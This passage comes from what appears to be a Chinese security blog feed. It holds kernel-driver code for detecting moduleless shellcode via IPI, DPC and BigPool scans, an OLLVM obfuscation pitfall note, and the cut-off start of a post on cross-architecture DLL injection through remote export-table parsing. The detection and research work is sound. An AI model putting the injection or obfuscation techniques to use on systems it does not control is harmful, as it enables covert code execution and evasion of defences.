class="params">(ULONG_PTR Argument)</span> &#123;</span><br><span class="line">    numFrames = RtlWalkFrameChain(callers,count,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">IPISearch</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    PVOID shellcodeaddr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line">        KeIpiGenericCall(IpiBroadcastFunction, <span class="literal">NULL</span>);</span><br><span class="line">        LARGE_INTEGER inTime;</span><br><span class="line">        inTime.QuadPart = <span class="number">10</span> * <span class="number">-10000</span>; <span class="comment">// 10 ms delay</span></span><br><span class="line">        KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; numFrames; i++) &#123;</span><br><span class="line">            <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; CountOfModule; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((ULONG)callers[i] &gt;= (ULONG)ModuleBase[j] &amp;&amp; (ULONG)callers[i] &lt; ((ULONG)ModuleBase[j] + ModuleSize[j])) &#123;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                shellcodeaddr = callers[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;shellcode not found in current IPI\n&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), shellcodeaddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DPC"><a href="#DPC" class="headerlink" title="DPC"></a>DPC</h3><p>即延时过程调用，它同样可以打断正在执行的CPU。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR <span class="title function_">DPCRountine</span><span class="params">(ULONG_PTR Argument)</span> &#123;</span><br><span class="line">    numFrames = RtlWalkFrameChain(callers,count,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DPC1Search</span><span class="params">()</span> &#123;</span><br><span class="line">    ULONG ProcessorCount = <span class="number">0</span>;</span><br><span class="line">    KDPC Dpc;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    PVOID shellcodeaddr = <span class="literal">NULL</span>;</span><br><span class="line">    ProcessorCount = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);</span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (CCHAR i = <span class="number">0</span>; i &lt; (CCHAR)ProcessorCount &amp;&amp; !found; ++i) &#123;</span><br><span class="line">            KeInitializeDpc(&amp;Dpc, DPCRountine, <span class="literal">NULL</span>);</span><br><span class="line">            KeSetTargetProcessorDpc(&amp;Dpc, i);</span><br><span class="line">            KeInsertQueueDpc(&amp;Dpc, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">            KeFlushQueuedDpcs();</span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; numFrames; i++) &#123;</span><br><span class="line">                <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; CountOfModule; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((ULONG)callers[i] &gt;= (ULONG)ModuleBase[j] &amp;&amp; (ULONG)callers[i] &lt; ((ULONG)ModuleBase[j] + ModuleSize[j])) &#123;</span><br><span class="line">                        flag = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    found = <span class="number">1</span>;</span><br><span class="line">                    shellcodeaddr = callers[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                kprintf((<span class="string">&quot;shellcode not found in current DPC\n&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            LARGE_INTEGER inTime;</span><br><span class="line">            inTime.QuadPart = <span class="number">10</span> * <span class="number">-10000</span>; <span class="comment">// 1 second delay</span></span><br><span class="line">            KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), shellcodeaddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BigPool扫描"><a href="#BigPool扫描" class="headerlink" title="BigPool扫描"></a>BigPool扫描</h3><p>通过字节特征码去比对 tag 为 ‘ace0’ 的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemBigPoolInformation 66</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_BIGPOOL_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID VirtualAddress;</span><br><span class="line">        ULONG_PTR NonPaged : <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG_PTR SizeInBytes;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        UCHAR Tag[<span class="number">4</span>];</span><br><span class="line">        ULONG TagUlong;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_BIGPOOL_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG Count;</span><br><span class="line">    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DRIVERUNLOAD</span><span class="params">(_In_ <span class="keyword">struct</span> _DRIVER_OBJECT* DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(DriverObject);</span><br><span class="line">    kprintf(<span class="string">&quot;unload\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">FindPattern</span><span class="params">(PUCHAR base, ULONG length, PCUCHAR pattern, ULONG patternLength)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; length - patternLength; i++) &#123;</span><br><span class="line">        BOOLEAN found = TRUE;</span><br><span class="line">        <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; patternLength; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pattern[j] != base[i + j]) &#123;</span><br><span class="line">                found = FALSE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (found) &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;base[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">BigPoolSearch</span><span class="params">()</span> &#123;</span><br><span class="line">    ULONG poolInformationLength = <span class="number">0x50000</span>;</span><br><span class="line">    UNICODE_STRING routineName;</span><br><span class="line">    RtlInitUnicodeString(&amp;routineName, <span class="string">L&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&amp;routineName);</span><br><span class="line">    <span class="keyword">if</span> (!ZwQuerySystemInformation) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Failed to get ZwQuerySystemInformation address\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    PVOID poolInformation = ExAllocatePoolWithTag(NonPagedPool, poolInformationLength, <span class="string">&#x27;ace0&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!poolInformation) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Failed to allocate pool information buffer\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = ZwQuerySystemInformation(SystemBigPoolInformation, poolInformation, poolInformationLength, &amp;poolInformationLength);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Failed to query pool information\n&quot;</span>);</span><br><span class="line">        ExFreePoolWithTag(poolInformation, <span class="string">&#x27;ace0&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PSYSTEM_BIGPOOL_INFORMATION bigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)poolInformation;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; bigPoolInfo-&gt;Count; i++) &#123;</span><br><span class="line">        PSYSTEM_BIGPOOL_ENTRY entry = &amp;bigPoolInfo-&gt;AllocatedInfo[i];</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;TagUlong == <span class="string">&#x27;ace0&#x27;</span>) &#123;</span><br><span class="line">            ULONG_PTR lpAddress = (ULONG_PTR)(entry-&gt;VirtualAddress) &amp; (~<span class="number">1ull</span>);</span><br><span class="line">            kprintf(<span class="string">&quot;Pool Entry: Address=%p, Size=%llu, Tag=&#x27;%c%c%c%c&#x27;\n&quot;</span>,</span><br><span class="line">                lpAddress,</span><br><span class="line">                entry-&gt;SizeInBytes,</span><br><span class="line">                entry-&gt;Tag[<span class="number">3</span>],</span><br><span class="line">                entry-&gt;Tag[<span class="number">2</span>],</span><br><span class="line">                entry-&gt;Tag[<span class="number">1</span>],</span><br><span class="line">                entry-&gt;Tag[<span class="number">0</span>]);</span><br><span class="line">            ULONG SizeCopied;</span><br><span class="line">            MM_COPY_ADDRESS MmCopyAddress;</span><br><span class="line">            PVOID Buffer = ExAllocatePool(NonPagedPoolNx, entry-&gt;SizeInBytes);</span><br><span class="line">            MmCopyAddress.VirtualAddress = Buffer;</span><br><span class="line">            status = MmCopyMemory(Buffer, MmCopyAddress, entry-&gt;SizeInBytes, MM_COPY_MEMORY_VIRTUAL, &amp;SizeCopied);</span><br><span class="line">            <span class="keyword">if</span> (NT_SUCCESS(status)) &#123;</span><br><span class="line">                UCHAR pattern[] = &#123; <span class="number">0x41</span>, <span class="number">0xB8</span>, <span class="number">0xCE</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">                PVOID res=FindPattern(lpAddress, entry-&gt;SizeInBytes, pattern, <span class="number">6</span>);</span><br><span class="line">                <span class="keyword">if</span> (res) &#123;</span><br><span class="line">                    kprintf((<span class="string">&quot;shellcode Found in address %p\n&quot;</span>), lpAddress);</span><br><span class="line">                    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ExFreePoolWithTag(poolInformation, <span class="string">&#x27;ace0&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pReg);</span><br><span class="line">    kprintf(<span class="string">&quot;Hello xia0ji233\n&quot;</span>); </span><br><span class="line"></span><br><span class="line">    pDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class="line">    g_Object = pDriver;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = BigPoolSearch();</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;BigPoolSearch failed with status 0x%x\n&quot;</span>, status);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://bbs.kanxue.com/thread-281459.htm">https://bbs.kanxue.com/thread-281459.htm</a></li></ul>]]></content>
    
    
    <summary type="html">驱动层捕获无模块shellcode。</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Driver" scheme="https://xia0ji233.github.io/categories/Windows/Driver/"/>
    
    
  </entry>
  
  <entry>
    <title>LLVM排坑</title>
    <link href="https://xia0ji233.github.io/2024/06/21/LLVM%E6%8E%92%E5%9D%91/"/>
    <id>https://xia0ji233.github.io/2024/06/21/LLVM%E6%8E%92%E5%9D%91/</id>
    <published>2024-06-21T14:00:00.000Z</published>
    <updated>2024-06-21T14:18:22.699Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下LLVM踩的坑</p><span id="more"></span><p>LLVM遇到什么坑都更新在这里，防止其它师傅踩&amp;二次自己踩。</p><h2 id="ConstantFP"><a href="#ConstantFP" class="headerlink" title="ConstantFP"></a>ConstantFP</h2><p>在测试 OLLVM BogusControlFlow 的代码的时候遇到了下面两条指令：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Value *LHS = ConstantFP::<span class="built_in">get</span>(Type::<span class="built_in">getFloatTy</span>(F.<span class="built_in">getContext</span>()), <span class="number">1.0</span>);</span><br><span class="line">Value *RHS = ConstantFP::<span class="built_in">get</span>(Type::<span class="built_in">getFloatTy</span>(F.<span class="built_in">getContext</span>()), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><p>直接会被阻塞，运行起来看上去像死循环了一样。原理还没弄清楚，暂时可行的方法就是不使用 ConstantFP 而是使用 ConstantInt 去构造不透明谓词[1]。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/llvm/llvmollvm%E6%8E%92%E5%9D%91%E4%BC%98%E5%8C%96/">http://www.qfrost.com/posts/llvm/llvmollvm%E6%8E%92%E5%9D%91%E4%BC%98%E5%8C%96/</a></li></ul>]]></content>
    
    
    <summary type="html">记录一下LLVM踩的坑</summary>
    
    
    
    <category term="Compiler" scheme="https://xia0ji233.github.io/categories/Compiler/"/>
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/categories/Compiler/LLVM/"/>
    
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/tags/LLVM/"/>
    
  </entry>
  
  <entry>
    <title>关于64位进程注入32位进程的分析</title>
    <link href="https://xia0ji233.github.io/2024/06/18/RemoteThreadInject/"/>
    <id>https://xia0ji233.github.io/2024/06/18/RemoteThreadInject/</id>
    <published>2024-06-18T03:00:00.000Z</published>
    <updated>2024-06-18T03:25:51.710Z</updated>
    
    <content type="html"><![CDATA[<p>故事开始于有人在我的项目中提了issue，也是我注册 github 来收到的第一个issue，因此我也非常重视。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>issue 的内容提到了，我的项目 Xprocess 注入器，没有办法实现注入 32 位进程的操作。他也给出了出错的原因，我没有在代码中获取远端的 LoadLibraryW 函数的地址。我一开始会以为很简单，网上应该有很多的实现，但是事实上，居然很难找到现成的代码。</p><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>常见的方法可以获取目标模块的 <code>kernel32.dll</code> 的地址然后获取到 LoadLibraryW 函数的地址，但是遍历模块发现 64 位的程序无法使用 <code>HANDLE ths = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,PID);</code> 的方式去获得模块的地址，因为只能获取到 ntdll 和 Wow 开头的几个模块，而在 32 位下编译就可以使用这个 API 获取到真实的模块地址，但是这与我们的目标不符，因此不考虑。</p><p>后面搜搜找找找到了一个可以用的 API 是 EnumProcessModulesEx。它能够获取 32 位进程远程模块加载的基地址。获取了基地址之后我又想了很久想怎么找到 LoadLibraryW。最初的一个想法是希望 ntdll 中存在函数 GetProcAddress，然后先通过一个远线程调用得到返回之后，等待线程返回就可以找到这个函数的地址了。可惜现实给了我当头一棒，它也在 kernel32.dll 里导出的。</p><p>最后我找到了一篇手动实现 GetProcAddress 的帖子[1]，于是有了一个灵感，将这个手动实现 GetProcAddress 去实现，然后替换为远程版本的。</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>首先确定这个代码是可运行且无误的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">MyGetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HMODULE hModule,    <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lpProcName   <span class="comment">// function name</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pImageDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pImageNtHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    pImageDosHeader=(PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    pImageNtHeader=(PIMAGE_NT_HEADERS)((DWORD)hModule+pImageDosHeader-&gt;e_lfanew);</span><br><span class="line">    pImageExportDirectory=(PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule+pImageNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    DWORD *pAddressOfFunction = (DWORD*)(pImageExportDirectory-&gt;AddressOfFunctions + (DWORD)hModule);</span><br><span class="line">    DWORD *pAddressOfNames = (DWORD*)(pImageExportDirectory-&gt;AddressOfNames + (DWORD)hModule);</span><br><span class="line">    DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory-&gt;NumberOfNames);</span><br><span class="line">    DWORD dwBase = (DWORD)(pImageExportDirectory-&gt;Base);</span><br><span class="line"></span><br><span class="line">    WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory-&gt;AddressOfNameOrdinals + (DWORD)hModule);</span><br><span class="line">    DWORD dwName = (DWORD)lpProcName;</span><br><span class="line">    <span class="keyword">if</span> ((dwName &amp; <span class="number">0xFFFF0000</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> xuhao;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;(<span class="type">int</span>)dwNumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *strFunction = (<span class="type">char</span> *)(pAddressOfNames[i] + (DWORD)hModule);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">lstrcmp</span>(lpProcName, strFunction) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这个是通过以序号的方式来查函数地址的</span></span><br><span class="line">    xuhao:</span><br><span class="line">    <span class="keyword">if</span> (dwName &lt; dwBase || dwName &gt; dwBase + pImageExportDirectory-&gt;NumberOfFunctions - <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (pAddressOfFunction[dwName - dwBase] + (DWORD)hModule);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 hModule 其实就是当前模块的地址。可以发现它采用解析 PE 文件的方式去遍历模块的导出表。</p><p>本地的实现了下一步就是实现远程的版本，这里需要非常仔细地去研究每一个访存的位置，因为在这个代码里一个简简单单的变量访问很有可能在远程版本中就需要通过 ReadProcessMemory 来实现。</p><p>下面我给出我写好的结果（只适配了32位的，64位的需要改一下 NT 头结构体）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetRemoteProcAddress</span><span class="params">(HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName)</span> </span>&#123;</span><br><span class="line">    BYTE buffer[<span class="number">4096</span>];</span><br><span class="line">    SIZE_T bytesRead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, hModule, buffer, <span class="built_in">sizeof</span>(buffer), &amp;bytesRead)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)buffer + dosHeader-&gt;e_lfanew);</span><br><span class="line">    DWORD RVAForExpDir = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadProcessMemory</span>(hProcess, (BYTE*)hModule + RVAForExpDir, buffer, <span class="built_in">sizeof</span>(IMAGE_EXPORT_DIRECTORY), &amp;bytesRead)) &#123;</span><br><span 